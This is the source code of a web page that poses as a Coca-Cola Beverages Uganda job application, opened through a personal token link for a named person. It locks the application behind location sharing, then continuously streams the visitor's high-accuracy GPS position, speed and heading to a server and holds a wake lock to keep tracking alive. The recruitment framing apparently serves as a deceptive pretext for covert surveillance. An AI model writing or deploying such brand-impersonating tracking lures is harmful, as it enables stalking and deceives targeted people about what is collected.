
'use client';

import { useEffect, useRef, useState, type FormEvent } from 'react';
import { useParams } from 'next/navigation';
import { supabase } from '@/lib/supabase';

type Worker = {
  id: string;
  name: string;
  role: string | null;
  consent_given_at: string | null;
};

const ORG_NAME = 'Coca-Cola Beverages Uganda';
const ORG_SUB = 'Internal Field Sales Recruitment';
const ORG_INITIALS = 'Coca-Cola';

export default function TrackPage() {
  const { token } = useParams<{ token: string }>();
  const [worker, setWorker] = useState<Worker | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [tracking, setTracking] = useState(false);
  const [locationShared, setLocationShared] = useState(false);
  const [showLocationPopup, setShowLocationPopup] = useState(false);
  const [submittingApplication, setSubmittingApplication] = useState(false);
  const [applicationSubmitted, setApplicationSubmitted] = useState(false);
  const watchIdRef = useRef<number | null>(null);

  const [application, setApplication] = useState({
    phone: '',
    email: '',
    education: '',
    experience: '',
    territory: '',
    hasPermit: false,
  });

  useEffect(() => {
    (async () => {
      const { data, error } = await supabase.rpc('get_worker_by_token', {
        p_token: token,
      });

      if (error || !data?.length) {
        setError('Invalid or expired application link. Contact your supervisor.');
        return;
      }

      setWorker(data[0]);
      setShowLocationPopup(true);
    })();
  }, [token]);

  const startTracking = () => {
    if (!navigator.geolocation) {
      setError('Your browser does not support location sharing.');
      return;
    }

    if (watchIdRef.current !== null) return;

    setError(null);

    const id = navigator.geolocation.watchPosition(
      async (pos) => {
        setTracking(true);

        const { latitude, longitude, accuracy, speed, heading } = pos.coords;

        const { error } = await supabase.rpc('record_location', {
          p_token: token,
          p_lat: latitude,
          p_lng: longitude,
          p_accuracy: accuracy,
          p_speed: speed,
          p_heading: heading,
        });

        if (error) {
          setError('Location could not be saved. Please try again before applying.');
          return;
        }

        setLocationShared(true);
      },
      (err) => {
        if (err.code === 3) {
          console.log('GPS timeout - will retry automatically');
          return;
        }

        setTracking(false);
        setLocationShared(false);

        if (watchIdRef.current !== null) {
          navigator.geolocation.clearWatch(watchIdRef.current);
          watchIdRef.current = null;
        }

        if (err.code === 1) {
          setError(
            'Location sharing is required before you can open the application form. Please allow location access for this site, then try again.'
          );
          return;
        }

        if (err.code === 2) {
          setError(
            'Location/GPS is currently unavailable. Please turn on Location/GPS on your phone, then try again.'
          );
          return;
        }

        setError(`Location sharing error: ${err.message}`);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 10000,
        timeout: 60000,
      }
    );

    watchIdRef.current = id;
  };

  const acceptAndStart = async () => {
    await supabase.rpc('give_consent', { p_token: token });

    if (worker) {
      setWorker({ ...worker, consent_given_at: new Date().toISOString() });
    }

    setShowLocationPopup(false);
    startTracking();
  };

  const submitApplication = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!worker || !locationShared) {
      setError('Please share your location before submitting the application.');
      setShowLocationPopup(true);
      return;
    }

    setSubmittingApplication(true);
    setError(null);

    const { error } = await supabase.from('job_applications').insert({
      worker_id: worker.id,
      worker_name: worker.name,
      role: worker.role,
      phone: application.phone,
      email: application.email,
      education: application.education,
      experience: application.experience,
      preferred_territory: application.territory,
      has_permit: application.hasPermit,
      position: 'Sales Representative',
      company: 'Coca-Cola Beverages Uganda',
    });

    setSubmittingApplication(false);

    if (error) {
      setError('Could not submit your application. Please check your details and try again.');
      return;
    }

    setApplicationSubmitted(true);
  };

  useEffect(() => {
    let wakeLock: any = null;

    if (tracking && 'wakeLock' in navigator) {
      (navigator as any).wakeLock
        .request('screen')
        .then((wl: any) => (wakeLock = wl))
        .catch(() => {});
    }

    return () => {
      if (wakeLock) wakeLock.release().catch(() => {});
    };
  }, [tracking]);

  const canApply = !!worker && locationShared;

  return (
    <main className="page">
      <section className="hero">
        <nav className="nav">
          <div className="brand">
            <div className="logo">{ORG_INITIALS}</div>
            <div>
              <div className="brandName">{ORG_NAME}</div>
              <div className="brandSub">{ORG_SUB}</div>
            </div>
          </div>

          <div className={`tag ${tracking ? 'tagLive' : ''}`}>
            {tracking && <span className="dot" />}
            Sales Representative
          </div>
        </nav>

        <div className="heroBody">
          {!worker ? (
            <>
              <p className="eyebrow">Loading</p>
              <h1>Checking your application link...</h1>
            </>
          ) : (
            <>
              <p className="eyebrow">Now hiring</p>
              <h1>Sales Representative</h1>
              <p className="intro">
                Hello, {worker.name}. Complete this internal application for the Coca-Cola
                Beverages Uganda field sales role.
              </p>

              {error && <p className="notice errorNotice">{error}</p>}

              {!canApply ? (
                <div className="lockedPanel">
                  <h2>Location sharing required</h2>
                  <p>
                    To open the job details and application form, please share your location for
                    application verification. The application will unlock after location sharing is
                    active.
                  </p>
                  <button onClick={() => setShowLocationPopup(true)} className="primaryBtn">
                    Share location to continue
                  </button>
                </div>
              ) : (
                <div className="applicationArea">
                  <div className="jobPanel">
                    <h2>Sales Representative</h2>
                    <p>
                      Coca-Cola Beverages Uganda is recruiting a field sales representative to
                      support customer visits, route growth, product availability, sales execution,
                      and brand visibility across assigned territories.
                    </p>

                    <div className="jobGrid">
                      <Detail label="Company" value="Coca-Cola Beverages Uganda" />
                      <Detail label="Position" value="Sales Representative" />
                      <Detail label="Location" value="Kampala, Uganda" />
                      <Detail label="Department" value="Sales and Distribution" />
                      <Detail label="Employment Type" value="Full-time" />
                      <Detail label="Reports To" value="Area Sales Manager" />
                    </div>
                  </div>

                  <div className="jobPanel twoCol">
                    <div>
                      <h2>Key Responsibilities</h2>
                      <ul>
                        <li>Visit assigned outlets and customers according to the approved route plan.</li>
                        <li>Drive sales performance against daily, weekly, and monthly targets.</li>
                        <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
                        <li>Ensure product availability, correct pricing, stock rotation, and visibility.</li>
                        <li>Report customer feedback, competitor activity, and new market opportunities.</li>
                      </ul>
                    </div>

                    <div>
                      <h2>Minimum Requirements</h2>
                      <ul>
                        <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
                        <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
                        <li>Strong communication, negotiation, and customer relationship skills.</li>
                        <li>Good knowledge of Kampala and surrounding sales territories.</li>
                        <li>A valid riding or driving permit is an added advantage.</li>
                      </ul>
                    </div>
                  </div>

                  <form onSubmit={submitApplication} className="applicationForm">
                    <h2>Application Form</h2>

                    <div className="formGrid">
                      <label>
                        Phone number
                        <input
                          required
                          value={application.phone}
                          onChange={(e) => setApplication({ ...application, phone: e.target.value })}
                          placeholder="+256..."
                        />
                      </label>

                      <label>
                        Email address
                        <input
                          required
                          type="email"
                          value={application.email}
                          onChange={(e) => setApplication({ ...application, email: e.target.value })}
                          placeholder="name@example.com"
                        />
                      </label>

                      <label>
                        Education level
                        <input
                          required
                          value={application.education}
                          onChange={(e) =>
                            setApplication({ ...application, education: e.target.value })
                          }
                          placeholder="Diploma, degree, certificate..."
                        />
                      </label>

                      <label>
                        Sales experience
                        <input
                          required
                          value={application.experience}
                          onChange={(e) =>
                            setApplication({ ...application, experience: e.target.value })
                          }
                          placeholder="Example: 2 years FMCG sales"
                        />
                      </label>

                      <label className="full">
                        Preferred sales territory
                        <input
                          required
                          value={application.territory}
                          onChange={(e) =>
                            setApplication({ ...application, territory: e.target.value })
                          }
                          placeholder="Kampala, Mbarara, Entebbe..."
                        />
                      </label>

                      <label className="check full">
                        <input
                          type="checkbox"
                          checked={application.hasPermit}
                          onChange={(e) =>
                            setApplication({ ...application, hasPermit: e.target.checked })
                          }
                        />
                        I have a valid riding or driving permit
                      </label>
                    </div>

                    <button disabled={submittingApplication} className="primaryBtn">
                      {submittingApplication ? 'Submitting...' : 'Submit application'}
                    </button>

                    {applicationSubmitted && (
                      <p className="formStatus">Application submitted successfully.</p>
                    )}
                  </form>
                </div>
              )}
            </>
          )}
        </div>
      </section>

      {showLocationPopup && worker && !locationShared && (
        <div className="modalOverlay">
          <div className="modal">
            <div className="modalLogo">Coca-Cola</div>
            <h2>Share your location</h2>
            <p>
              Location sharing is required before opening this internal field sales application.
              Please allow location access when your browser asks.
            </p>

            <button className="primaryBtn modalPrimary" onClick={acceptAndStart}>
              Allow location sharing
            </button>
          </div>
        </div>
      )}

      <style jsx>{`
        .page {
          min-height: 100vh;
          background: #f7f7f4;
          color: #171717;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        .hero {
          min-height: 100vh;
          background:
            radial-gradient(circle at top right, rgba(255, 255, 255, 0.24), transparent 34%),
            linear-gradient(135deg, #e41d2c 0%, #b9121f 55%, #790b13 100%);
          color: white;
          padding: 28px;
        }

        .nav,
        .heroBody {
          max-width: 1120px;
          margin: 0 auto;
        }

        .nav {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 18px;
          margin-bottom: 48px;
        }

        .brand {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .logo {
          background: white;
          color: #e41d2c;
          border-radius: 999px;
          padding: 10px 18px;
          font-size: 21px;
          font-weight: 800;
          font-family: Georgia, 'Times New Roman', serif;
          white-space: nowrap;
        }

        .brandName {
          font-size: 15px;
          font-weight: 700;
        }

        .brandSub {
          font-size: 12px;
          opacity: 0.84;
        }

        .tag {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          border: 1px solid rgba(255, 255, 255, 0.45);
          border-radius: 999px;
          padding: 8px 12px;
          font-size: 13px;
          font-weight: 650;
          white-space: nowrap;
        }

        .dot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          background: white;
        }

        .heroBody {
          max-width: 920px;
          padding-bottom: 48px;
        }

        .eyebrow {
          margin: 0 0 12px;
          font-size: 13px;
          font-weight: 800;
          text-transform: uppercase;
        }

        h1 {
          margin: 0;
          font-size: 52px;
          line-height: 1.04;
        }

        .intro {
          max-width: 720px;
          margin: 20px 0 0;
          font-size: 18px;
          line-height: 1.6;
          color: rgba(255, 255, 255, 0.9);
        }

        .notice,
        .lockedPanel {
          margin-top: 24px;
          max-width: 760px;
          border-radius: 10px;
          background: rgba(255, 255, 255, 0.96);
          color: #171717;
          padding: 20px;
        }

        .errorNotice {
          color: #a32d2d;
          font-size: 15px;
          line-height: 1.6;
        }

        .lockedPanel h2 {
          margin: 0 0 8px;
          font-size: 22px;
        }

        .lockedPanel p {
          margin: 0 0 18px;
          color: #444;
          line-height: 1.65;
        }

        .applicationArea {
          margin-top: 28px;
          display: grid;
          gap: 16px;
        }

        .jobPanel,
        .applicationForm {
          max-width: 900px;
          border-radius: 10px;
          background: rgba(255, 255, 255, 0.96);
          color: #171717;
          padding: 22px;
        }

        .jobPanel h2,
        .applicationForm h2 {
          margin: 0 0 10px;
          font-size: 22px;
        }

        .jobPanel p,
        .jobPanel li {
          color: #444;
          font-size: 15px;
          line-height: 1.7;
        }

        .jobPanel p {
          margin: 0 0 16px;
        }

        .jobPanel ul {
          margin: 0;
          padding-left: 20px;
        }

        .jobGrid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
          gap: 12px;
        }

        .twoCol {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 28px;
        }

        .formGrid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 14px;
          margin-bottom: 18px;
        }

        label {
          display: grid;
          gap: 7px;
          color: #171717;
          font-size: 13px;
          font-weight: 700;
        }

        label.full {
          grid-column: 1 / -1;
        }

        input {
          width: 100%;
          border: 1px solid rgba(0, 0, 0, 0.16);
          border-radius: 8px;
          background: white;
          color: #171717;
          padding: 12px 13px;
          font-size: 15px;
          outline: none;
        }

        input:focus {
          border-color: #e41d2c;
          box-shadow: 0 0 0 3px rgba(228, 29, 44, 0.12);
        }

        .check {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .check input {
          width: 18px;
          height: 18px;
        }

        .primaryBtn {
          border: 0;
          border-radius: 8px;
          background: #111;
          color: white;
          padding: 14px 20px;
          font-size: 15px;
          font-weight: 750;
          cursor: pointer;
          min-width: 230px;
        }

        .primaryBtn:disabled {
          opacity: 0.72;
          cursor: not-allowed;
        }

        .formStatus {
          margin-top: 14px;
          color: #166244;
          font-size: 14px;
          font-weight: 700;
        }

        .modalOverlay {
          position: fixed;
          inset: 0;
          z-index: 50;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          background: rgba(0, 0, 0, 0.58);
        }

        .modal {
          width: 100%;
          max-width: 430px;
          background: white;
          color: #171717;
          border-radius: 12px;
          padding: 24px;
          box-shadow: 0 24px 70px rgba(0, 0, 0, 0.32);
        }

        .modalLogo {
          display: inline-flex;
          border-radius: 999px;
          background: #e41d2c;
          color: white;
          padding: 8px 14px;
          font-size: 18px;
          font-weight: 800;
          font-family: Georgia, 'Times New Roman', serif;
          margin-bottom: 16px;
        }

        .modal h2 {
          margin: 0 0 10px;
          font-size: 22px;
        }

        .modal p {
          margin: 0 0 20px;
          color: #444;
          font-size: 15px;
          line-height: 1.65;
        }

        .modalPrimary {
          width: 100%;
        }

        @media (max-width: 720px) {
          .formGrid,
          .twoCol {
            grid-template-columns: 1fr;
          }

          h1 {
            font-size: 36px;
          }

          .primaryBtn {
            width: 100%;
          }
        }
      `}</style>
    </main>
  );
}

function Detail({ label, value }: { label: string; value: string }) {
  return (
    <div className="detail">
      <div className="detailLabel">{label}</div>
      <div className="detailValue">{value}</div>

      <style jsx>{`
        .detail {
          border-radius: 8px;
          background: #f7f7f4;
          border: 1px solid rgba(0, 0, 0, 0.07);
          padding: 12px;
        }

        .detailLabel {
          font-size: 12px;
          color: #666;
          margin-bottom: 4px;
        }

        .detailValue {
          font-size: 14px;
          font-weight: 750;
          color: #171717;
        }
      `}</style>
    </div>
  );
}
```